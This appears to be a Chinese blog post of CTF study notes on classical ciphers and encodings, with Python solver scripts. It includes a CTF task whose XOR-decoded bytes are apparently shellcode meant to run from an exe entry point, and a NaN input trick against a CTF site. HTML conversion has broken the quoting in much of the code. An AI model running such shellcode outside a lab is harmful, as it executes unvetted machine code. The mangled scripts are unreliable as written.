<p>6.猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码。可以使用米斯特小工具试试，如果不行的话可以再试试其他变种<br>7.VBscript.Encode <a href="http://adophper.com/encode.html" target="_blank" rel="noopener">http://adophper.com/encode.html</a><br>#@<del>^TgAAAA==’[6<em>liLa6++p’aXvfiLaa6i[[avWi[[a*p[[6</em>!I’[6cp’aXvXILa6fp[:6+Wp[:XvWi[[6+XivRIAAA==^#</del>@<br>解完密之后是这样<br>&#x45;&#x6e;&#x63;&#x6f;&#x64;&#x65;&#x40;&#x64;&#x65;&#x63;&#x6f;&#x64;&#x65;<br>这个是网页用的一种不能算编码的东西，控制台可解，还有就是发布到百度也会自动转成ascii<br>控制台document.write(“&#x45;&#x6e;&#x63;&#x6f;&#x64;&#x65;&#x40;&#x64;&#x65;&#x63;&#x6f;&#x64;&#x65;”)就行了<br>8.<br>#小明某一天收到一封密信，信中写了几个不同的年份：辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。信的背面还写有“+甲子”，请解出这段密文。key值：CTF{XXX}<br>从题目可以知道是 “干支数 + 甲子（60）”= 数字（ascii）–&gt;对应的字母<br>辛卯，为干支之一，顺序为第28个 –&gt; 88 –&gt;  X<br>癸巳，为干支之一，顺序为第30个 –&gt; 90 –&gt;  Z<br>丙戌，为干支之一，顺序为第23个 –&gt; 93 –&gt;  S<br>辛未，为干支之一，顺序为第8个 –&gt; 68 –&gt;  D<br>庚辰，为干支之一，顺序为第17个 –&gt; 77 –&gt;  M<br>癸酉，为干支之一,顺序为第10个 –&gt; 70 –&gt;  F<br>己卯，为干支之一，顺序为第16个 –&gt; 76 –&gt;  L<br>癸巳，为干支之一，顺序为第30个 –&gt; 90 –&gt;  Z<br>古典密码，待解密字符串为： XZSDMFLZ<br>古典密码以换位、替换为主，试试常见的古典密码：换位栅栏、替换凯撒。<br>这题是这两种组合，没有一点提示，很尴尬、、、<br>首先，栅栏密码（两栏）–&gt; 解密：XMZFSLDZ<br>再用凯撒 –&gt; 解密：SHUANGYU<br>#<br>0x1 费纳姆密码<br>费纳姆密码其实是一种由二进制产生的替换密码。<br>这是一种二战期间德军使用的密码，一时令盟军难以破译，<br>其原理主要是把二进制数据每7位分出一组，再和密钥的每一位异或即可得到<br>import re</p>
<p>key = ‘large’<br>s = ‘00000100001000001101000001100001010’<br>key = list(key)<br>s = re.findall(‘.{7}’,s)<br>flag = ‘’<br>for i in range(len(s)):<br>    flag += chr(ord(key[i]) ^ int(s[i],2))</p>
<p>print flag</p>
<p>0x2 曼切斯特编码和差分曼切斯特编码<br>在曼彻斯特编码中，每一位的中间有一跳变，位中间的跳变既作时钟信号，又作数据信号；从高到低跳变表示”1”，从低到高跳变表示”0”。还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示”0”或”1”，有跳变为”0”，无跳变为”1”。<br><a href="http://www.cnblogs.com/BinB-W/p/5045918.html" target="_blank" rel="noopener">http://www.cnblogs.com/BinB-W/p/5045918.html</a><br>#!/usr/bin/env python<br>#coding:utf-8<br>import re<br>hex1 = ‘AAAAA56A69AA55A95995A569AA95565556’ # #  0x8893CA58<br>#hex1 = ‘AAAAA56A69AA556A965A5999596AA95656’<br>def bintohex(s1):<br>    s2 = ‘’<br>    s1 = re.findall(‘.{4}’,s1)<br>    print ‘每一个hex分隔:’,s1<br>    for i in s1:<br>        s2 += str(hex(int(i,2))).replace(‘0x’,’’)</p>
<pre><code>print &apos;ID:&apos;,s2</code></pre><p>def diffmqst(s):<br>    s1 = ‘’<br>    s = re.findall(‘.{2}’,s)<br>    cc = ‘01’<br>    for i in s:<br>        if i == cc:<br>            s1 += ‘0’<br>        else:<br>            s1 += ‘1’<br>        cc = i  # 差分加上cc = i<br>    print ‘差分曼切斯特解码:’,s1<br>    bintohex(s1)<br>def mqst(s):  #只能算曼切斯特编码,无法算差分<br>    mdict = {‘5’: ‘00’, ‘6’: ‘01’, ‘9’: ‘10’, ‘A’: ‘11’}<br>    a1 = ‘’.join(mdict[i] for i in s)<br>    a2 = ‘’.join(mdict[i][::-1] for i in s)<br>    print ‘曼切斯特解码:   ‘,a1<br>    print ‘曼切斯特解码2:  ‘,a2<br>    bintohex(a1)<br>    bintohex(a2)<br>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    bin1 = bin(int(hex1,16))[2:]<br>    diffmqst(bin1)</p>
<pre><code>mqst(hex1)</code></pre><p>0x3 轮盘密码 Wheel Cipher</p>
<p>也是二战期间的使用的一种密码，原理大概就是给定一个密码表和一个密钥，根据密钥对每一列旋转到第一位（和轮盘一样）， 然后看每一列的字符是否有规律<br>在ISCC2017上就有这样一个题, 脚本如下:</p>
<p>#coding:utf-8<br>a =”””<br>ZWAXJGDLUBVIQHKYPNTCRMOSFE<br>KPBELNACZDTRXMJQOYHGVSFUWI<br>BDMAIZVRNSJUWFHTEQGYXPLOCK<br>RPLNDVHGFCUKTEBSXQYIZMJWAO<br>IHFRLABEUOTSGJVDKCPMNZQWXY<br>AMKGHIWPNYCJBFZDRUSLOQXVET<br>GWTHSPYBXIZULVKMRAFDCEONJQ<br>NOZUTWDCVRJLXKISEFAPMYGHBQ<br>XPLTDSRFHENYVUBMCQWAOIKZGJ<br>UDNAJFBOWTGVRSCZQKELMXYIHP<br>MNBVCXZQWERTPOIUYALSKDJFHG<br>LVNCMXZPQOWEIURYTASBKJDFHG<br>JZQAWSXCDERFVBGTYHNUMKILOP<br>“””</p>
<p>b=”NFQKSEVOQOFNP”<br>c=”2,3,7,5,13,12,9,1,8,10,4,11,6”<br>a=a.splitlines()<br>a.pop(0)</p>
<h1 id="print-a"><a href="#print-a" class="headerlink" title="print a"></a>print a</h1><p>s = ‘’<br>t = []<br>c=c.split(‘,’)<br>for i in range(0,len(c)):<br>    #print a[int(c[i])-1].index(b[i])+1<br>    index = a[int(c[i])-1].index(b[i])<br>    a[int(c[i])-1] = a[int(c[i])-1][index:]+a[int(c[i])-1][:index]<br>    print a[int(c[i])-1]<br>    t.append(a[int(c[i])-1])<br>    # print ‘交换’,i,’和’,int(c[i])-1</p>
<p>for y in range(len(t[0])):<br>    for x in range(0,len(t)):<br>        s += t[x][y]</p>
<pre><code>print &apos;第&apos;+str(y)+&apos;列&apos;,&apos;&apos;.join(s)

s = &apos;&apos;</code></pre><p>0x4 xxencode</p>
<p>XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。它所选择的可打印字符是：+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz，一共64个字符。跟base64打印字符相比，就是多一个“-” 字符，少一个”/” 字符。</p>
<p>源文本：The quick brown fox jumps over the lazy dog</p>
<p>编码后：hJ4VZ653pOKBf647mPrRi64NjS0-eRKpkQm-jRaJm65FcNG-gMLdt64FjNkc+</p>
<p>解密地址:<a href="http://web.chacuo.net/charsetxxencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetxxencode</a></p>
<p>0x5 UUencode编码</p>
<p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p>
<p>源文本：The quick brown fox jumps over the lazy dog</p>
<p>编码后： M5&amp;AE(‘%U:6-K(&amp;)R;W=N(&amp;9O&gt;”!J=6UP&lt;R!O=F5R(‘1H92!L87IY(&amp;1O9PH*</p>
<p>解密地址:<a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetuuencode</a></p>
<p>0x6 Unicode编码</p>
<p>Unicode编码有以下四种编码方式：</p>
<p>源文本：The</p>
<p>&amp;#x [Hex]：The</p>
<p>&amp;# [Decimal]：The</p>
<p>\U [Hex]：\U0054\U0068\U0065</p>
<p>\U+ [Hex]：\U+0054\U+0068\U+0065</p>
<p>0x7 Escape/Unescape编码</p>
<p>Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p>
<p>源文本：The</p>
<p>编码后：%u0054%u0068%u0065</p>
<p>0x8 埃特巴什码</p>
<p>埃特巴什码(Atbash Cipher)是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：</p>
<p>ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>ZYXWVUTSRQPONMLKJIHGFEDCBA</p>
<p>明文：the quick brown fox jumps over the lazy dog</p>
<p>密文：gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</p>
<p>0x9 dvorak 键盘编码</p>
<p>Dvorak键盘是一种将常用字母都归在一起，以期提高打字速度键盘布局。1936年由美国人August Dvorak设计。键盘布局在硬盘里。现在通用的QWERTY键盘，以键盘第一排字母的左边6个字母而得名。<br>#仿射函数<br>密文mzdvezc是用仿射函数y=5x+12加密得到的，试对其解密。<br>直接一个Python解决问题<br>#!/usr/bin/env python</p>
<h1 id="coding-utf-8-1"><a href="#coding-utf-8-1" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p><strong>Url</strong> = ‘Http://<a href="http://www.purpleroc.com&#39;" target="_blank" rel="noopener">www.purpleroc.com&#39;</a><br><strong>author</strong> = ‘Tracy_梓朋’<br>def affine(a, b):<br>    pwd_dic = {}<br>    for i in range(26):<br>        pwd_dic[chr(((a*i+b)%26)+97)] = chr(i+97)<br>    return pwd_dic<br>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    pwd_dic = {}<br>    pwd = “mzdvezc”   #密文mzdvezc<br>    plain = []<br>    pwd_dic = affine(5, 12)   #5，12 分别为两个系数<br>    for i in pwd:<br>        plain.append(pwd_dic[i])<br>    print “You Flag is: “ + “”.join(plain)</p>
<p>#异或加密<br>#####################################################<br>小野入侵了一个台服务器，发现一个保存重要密码的程序代码，小野又发现了一些蛛丝马迹，他能破解么？<br>附件： 公司内部密钥程序.txt<br>0xBE, 0x2A, 0x28, 0x48, 0x7A, 0x5C, 0x2A, 0x21, 0xCB, 0x93, 0x0D, 0x2A, 0x70,<br>0x36, 0xD3, 0x4E, 0xC9, 0xB6, 0xCF, 0x3C, 0xB6, 0x71, 0x99, 0xF5, 0x46, 0x69, 0xA1,<br>0x24, 0xF9, 0x71, 0x70, 0x11, 0x2A, 0x37, 0x31, 0x27, 0x30, 0x16, 0x71, 0x90, 0x26,<br>0xC9, 0x18, 0x72, 0xC9, 0x09, 0x4E, 0xC9, 0x0B, 0x5E, 0xC9, 0x4B, 0xC9, 0x2B, 0x4A,<br>0xEF, 0x7F, 0x28, 0x48, 0x7A, 0x5C, 0x37, 0x47, 0xD7, 0xBD, 0x15, 0xBA, 0xD7, 0x22,<br>0xC9, 0x07, 0x7E, 0xC9, 0x0E, 0x47, 0x3A, 0x41, 0x8F, 0xC9, 0x1B, 0x62, 0x41, 0x9F,<br>0x71, 0xBD, 0x05, 0xC9, 0x76, 0xF9, 0x41, 0xB7, 0xDB, 0x4D, 0xFC, 0x44, 0x78, 0x86,<br>0x36, 0x4A, 0x83, 0x88, 0x45, 0x41, 0x92, 0x04, 0xA9, 0xB3, 0x79, 0x16, 0x66, 0x5E,<br>0x37, 0xA6, 0xC9, 0x1B, 0x66, 0x41, 0x9F, 0x24, 0xC9, 0x7E, 0x39, 0xC9, 0x1B, 0x5E,<br>0x41, 0x9F, 0x41, 0x6E, 0xF9, 0xD7, 0x1D, 0xE9, 0x15, 0x23, 0x7F, 0x28, 0x48, 0x7A,<br>0x5C, 0x37, 0xEB, 0x71, 0x99, 0x11, 0x2A, 0x35, 0x34, 0x36, 0x64, 0x2A, 0x14, 0x29,<br>0x68, 0x7A, 0xC9, 0x86, 0x11, 0x12, 0x12, 0x11, 0xBD, 0x15, 0xBE, 0x11, 0xBD, 0x15,<br>0xBA, 0xD2, 0xD2, 0xD2, 0xD2<br>企业加密方式.txt 公司内部所有的加密形式均为异或加密，且只使用异或加密，加密KEY：0x42 请牢记，保密！<br>异或完了后,把它放到一个exe的入口点,然后,直接运行exe就可以弹出flag.<br>#####################################################<br>#!/usr/bin/env python</p>
<h1 id="coding-utf-8-2"><a href="#coding-utf-8-2" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p><strong>Url</strong> = ‘Http://<a href="http://www.purpleroc.com&#39;" target="_blank" rel="noopener">www.purpleroc.com&#39;</a><br><strong>author</strong> = ‘Tracy_梓朋’<br>pwd = “BE,  0x2A,  0x28,  0x48,  0x7A,  0x5C,  0x2A,  0x21,  0xCB,  0x93,  0x0D,  0x2A,  <br>    0x70,  0x36,  0xD3,  0x4E,  0xC9,  0xB6,  0xCF,  0x3C,  0xB6,  0x71,  0x99,  0xF5,  0x46,  <br>    0x69,  0xA1,  0x24,  0xF9,  0x71,  0x70,  0x11,  0x2A,  0x37,  0x31,  0x27,  0x30,  0x16,  <br>    0x71,  0x90,  0x26,  0xC9,  0x18,  0x72,  0xC9,  0x09,  0x4E,  0xC9,  0x0B,  0x5E,  0xC9,  <br>    0x4B,  0xC9,  0x2B,  0x4A,  0xEF,  0x7F,  0x28,  0x48,  0x7A,  0x5C,  0x37,  0x47,  0xD7,  <br>    0xBD,  0x15,  0xBA,  0xD7,  0x22,  0xC9,  0x07,  0x7E,  0xC9,  0x0E,  0x47,  0x3A,  0x41,  <br>    0x8F,  0xC9,  0x1B,  0x62,  0x41,  0x9F,  0x71,  0xBD,  0x05,  0xC9,  0x76,  0xF9,  0x41,  <br>    0xB7,  0xDB,  0x4D,  0xFC,  0x44,  0x78,  0x86,  0x36,  0x4A,  0x83,  0x88,  0x45,  0x41,  <br>    0x92,  0x04,  0xA9,  0xB3,  0x79,  0x16,  0x66,  0x5E,  0x37,  0xA6,  0xC9,  0x1B,  0x66,  <br>    0x41,  0x9F,  0x24,  0xC9,  0x7E,  0x39,  0xC9,  0x1B,  0x5E,  0x41,  0x9F,  0x41,  0x6E,  <br>    0xF9,  0xD7,  0x1D,  0xE9,  0x15,  0x23,  0x7F,  0x28,  0x48,  0x7A,  0x5C,  0x37,  0xEB,  <br>    0x71,  0x99,  0x11,  0x2A,  0x35,  0x34,  0x36,  0x64,  0x2A,  0x14,  0x29,  0x68,  0x7A,  <br>    0xC9,  0x86,  0x11,  0x12,  0x12,  0x11,  0xBD,  0x15,  0xBE,  0x11,  0xBD,  0x15,  0xBA,  <br>    0xD2,  0xD2,  0xD2,  0xD2”<br>key = “0x42”<br>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    cipher = pwd.split(‘,  0x’)<br>    #print “”.join(cipher)<br>    plain = []<br>    temp = []<br>    for i in cipher:<br>        open(“../../DATA/BASIC05/basic5.bin”,”ab”).write(chr(int(i, 16) ^ int(key, 16)))<br>    #print “Flag is: Vk*8wvt&#38;”</p>
<p>############################################<br>上次的用完了，我生日又快到了，再给我点流量当生日礼物吧。 <a href="http://script.iscc.org.cn/script03/" target="_blank" rel="noopener">http://script.iscc.org.cn/script03/</a><br>看上去像去年的神兽，可其实不是，也不知道是要考啥，有个提示转流量下限是1G。 所以让结果等于NAN，无穷小就行了<br>          输入：99e9999-99e1111 得到flag：<br>          你打算送我NANMB流量。 谢谢你给我这么多流量，flag给你了。 flag:{68d43d512ca7214e05acc96cc100515e}<br>############################################<br>波利比奥斯方阵密码<br> 2  3  4   5<br>A  B  C  D   E<br>F  G  H  I/J K<br>L  M  N  O   P<br>Q  Q  S  T   U<br>V  W  X  Y   Z<br>加密实例：<br>明文： THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG<br>密文： 442315 4145241325 1242345233 213453 2445323543 442315 31115554 143422<br>#普莱菲尔密码<br>加密解密实例(ps：这里加解密也是横向编制密码表)：<br>#!python</p>
<blockquote>
<blockquote>
<blockquote>
<p>from pycipher import Playfair<br>Playfair(‘CULTREABDFGHIKMNOPQSVWXYZ’).encipher(‘THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG’)<br>#输出’UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV’<br>Playfair(‘CULTREABDFGHIKMNOPQSVWXYZ’).decipher(‘UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV’)<br>#输出’THEQUICKBROWNFOXIUMPSOVERTHELAZYDOGX’<br>#维吉尼亚密码<br>明文： THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG<br>密钥(循环使用，密钥越长相对破解难度越大)： CULTURE<br>（2）已知密钥加解密<br>#!python<br>from pycipher import Vigenere<br>Vigenere(‘CULTURE’).encipher(‘THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG’)<br>‘VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK’<br>Vigenere(‘CULTURE’).decipher(‘VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK’)<br>‘THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG’<br>#格罗斯费尔德密码(Gronsfeld cipher)<br>#!python<br>from pycipher import Gronsfeld<br>Gronsfeld([2,20,11,45,20,43,4]).encipher(‘THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG’)<br>‘VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK’<br>Gronsfeld([2,20,11,45,20,43,4]).decipher(‘VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK’)<br>‘THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG’<br>#自动密钥密码<br>#Porta密码–Porta密码(Porta Cipher)是一个由意大利那不勒斯的医生Giovanni Battista della Porta发明的多表代换密码，Porta密码具有加密解密过程的是相同的特点<br>密表<br>#!shell<br>| KEYS | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z |<br>| —- | ————————————————— |<br>| A,B  | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M |<br>| C,D  | O P Q R S T U V W X Y Z N M A B C D E F G H I J K L |<br>| E,F  | P Q R S T U V W X Y Z N O L M A B C D E F G H I J K |<br>| G,H  | Q R S T U V W X Y Z N O P K L M A B C D E F G H I J |<br>| I,J  | R S T U V W X Y Z N O P Q J K L M A B C D E F G H I |<br>| K,L  | S T U V W X Y Z N O P Q R I J K L M A B C D E F G H |<br>| M,N  | T U V W X Y Z N O P Q R S H I J K L M A B C D E F G |<br>| O,P  | U V W X Y Z N O P Q R S T G H I J K L M A B C D E F |<br>| Q,R  | V W X Y Z N O P Q R S T U F G H I J K L M A B C D E |<br>| S,T  | W X Y Z N O P Q R S T U V E F G H I J K L M A B C D |<br>| U,V  | X Y Z N O P Q R S T U V W D E F G H I J K L M A B C |<br>| W,X  | Y Z N O P Q R S T U V W X C D E F G H I J K L M A B |<br>| Y,Z  | Z N O P Q R S T U V W X Y B C D E F G H I J K L M A |<br>明文： THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG<br>密钥(循环使用，密钥越长相对破解难度越大)： CULTURE<br>加密过程：明文字母’T’列与密钥字母’C’行交点就是密文字母’F’,以此类推。<br>密文： FRW HKQRY YMFMF UAA OLWHD ALWI JPT ZXHC NGV<br>在线解码：<a href="http://www.practicalcryptography.com/ciphers/classical-era/porta/" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/classical-era/porta/</a><br>#培根密码<br>#!shell<br>A = aaaaa  I/J = abaaa  R = baaaa</p>
</blockquote>
</blockquote>
</blockquote>
<p>B = aaaab  K = abaab    S = baaab</p>
<p>C = aaaba  L = ababa    T = baaba</p>
<p>D = aaabb  M = ababb    U/V = baabb</p>
<p>E = aabaa  N = abbaa    W = babaa</p>
<p>F = aabab  O = abbab    X = babab</p>
<p>G = aabba  P = abbba    Y = babba</p>
<p>H = aabbb  Q = abbbb    Z = babbb<br>明文： T H E F O X<br>密文： baaba aabbb aabaa aabab abbab babab<br>#asp混淆加密，VBScript/JScript.Encode<br> aspencode<br>密文#@<del>^EQAAAA==VXlj4UmkaYAUmKN3bAYAAA==^#</del>@?<br>丢到<a href="http://adophper.com/encode.html解密即可。。" target="_blank" rel="noopener">http://adophper.com/encode.html解密即可。。</a><br>#aaencode 颜文字 直接开发者模式console运行<br>?ω??= /｀ｍ′）? ~┻━┻   //<em>′?｀</em>/ [‘<em>‘]; o=(???)  =</em>=3; c=(?Θ?) =(???)-(???); (?Д?) =(?Θ?)= (o^<em>^o)/ (o^</em>^o);(?Д?)={?Θ?: ‘<em>‘ ,?ω?? : ((?ω??==3) +’</em>‘) [?Θ?] ,???? :(?ω??+ ‘<em>‘)[o^</em>^o -(?Θ?)] ,?Д??:((???==3) +’<em>‘)[???] }; (?Д?) [?Θ?] =((?ω??==3) +’</em>‘) [c^<em>^o];(?Д?) [‘c’] = ((?Д?)+’</em>‘) [ (???)+(???)-(?Θ?) ];(?Д?) [‘o’] = ((?Д?)+’<em>‘) [?Θ?];(?o?)=(?Д?) [‘c’]+(?Д?) [‘o’]+(?ω?? +’</em>‘)[?Θ?]+ ((?ω??==3) +’<em>‘) [???] + ((?Д?) +’</em>‘) [(???)+(???)]+ ((???==3) +’<em>‘) [?Θ?]+((???==3) +’</em>‘) [(???) - (?Θ?)]+(?Д?) [‘c’]+((?Д?)+’<em>‘) [(???)+(???)]+ (?Д?) [‘o’]+((???==3) +’</em>‘) [?Θ?];(?Д?) [‘<em>‘] =(o^</em>^o) [?o?] [?o?];(?ε?)=((???==3) +’<em>‘) [?Θ?]+ (?Д?) .?Д??+((?Д?)+’</em>‘) [(???) + (???)]+((???==3) +’<em>‘) [o^</em>^o -?Θ?]+((???==3) +’<em>‘) [?Θ?]+ (?ω?? +’</em>‘) [?Θ?]; (???)+=(?Θ?); (?Д?)[?ε?]=’\‘; (?Д?).?Θ??=(?Д?+ ???)[o^<em>^o -(?Θ?)];(o???o)=(?ω?? +’</em>‘)[c^<em>^o];(?Д?) [?o?]=’&quot;‘;(?Д?) [‘</em>‘] ( (?Д?) [‘<em>‘] (?ε?+(?Д?)[?o?]+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (?Θ?)+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ (???)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ ((???) + (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ ((o^</em>^o) +(o^<em>^o))+ ((o^</em>^o) - (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ ((o^<em>^o) +(o^</em>^o))+ (???)+ (?Д?)[?ε?]+((???) + (?Θ?))+ (c^<em>^o)+ (?Д?)[?ε?]+(???)+ ((o^</em>^o) - (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ (?Θ?)+ (c^<em>^o)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ ((???) + (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ (???)+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ (???)+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ ((???) + (o^</em>^o))+ (?Д?)[?ε?]+((???) + (?Θ?))+ (???)+ (?Д?)[?ε?]+(???)+ (c^<em>^o)+ (?Д?)[?ε?]+(?Θ?)+ (?Θ?)+ ((o^</em>^o) - (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (?Θ?)+ (?Д?)[?ε?]+(?Θ?)+ ((o^<em>^o) +(o^</em>^o))+ ((o^<em>^o) +(o^</em>^o))+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (?Θ?)+ (?Д?)[?ε?]+(?Θ?)+ ((o^<em>^o) - (?Θ?))+ (o^</em>^o)+ (?Д?)[?ε?]+(?Θ?)+ (???)+ (o^<em>^o)+ (?Д?)[?ε?]+(?Θ?)+ ((o^</em>^o) +(o^<em>^o))+ ((o^</em>^o) - (?Θ?))+ (?Д?)[?ε?]+(?Θ?)+ ((???) + (?Θ?))+ (?Θ?)+ (?Д?)[?ε?]+(?Θ?)+ ((o^<em>^o) +(o^</em>^o))+ (c^<em>^o)+ (?Д?)[?ε?]+(?Θ?)+ ((o^</em>^o) +(o^<em>^o))+ (???)+ (?Д?)[?ε?]+(???)+ ((o^</em>^o) - (?Θ?))+ (?Д?)[?ε?]+((???) + (?Θ?))+ (?Θ?)+ (?Д?)[?o?]) (?Θ?)) (‘_’);<br>#jsfuck<br>只包含<a href></a>!+六个字符，可以直接在console控制台运行得到flag<br><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a><br>#jother<br>8个少量字符包括:!+()[]{}<br>直接在浏览器(IE可以)的控制台里输入密文即可执行解密：<br>#brainfuck<br>只有八种符号，所有的操作都由这八种符号( &gt; &lt; + - . , [ ] )的组合来完成。<br>明文：hello!<br>#!shell<br>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .—. +++++ ++..+ ++.&lt;+ +++++ +++++<br>[-&gt;++ +++++ ++++&lt; ]&gt;+++ ++++. &lt;++++ +++[- &gt;—- —&lt;] &gt;–.&lt; +++++ ++[-&gt;<br>—– –&lt;]&gt; —– —– .&lt;<br>#ook<br>#和brainfuck是一个本地解密站点，解密即可<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>    Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.<br>    Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!<br>    Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!<br>    Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.<br>    Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>    Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>    Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook.<br>    Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!<br>    Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>    Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?<br>    Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?<br>    Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>    Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook.<br>    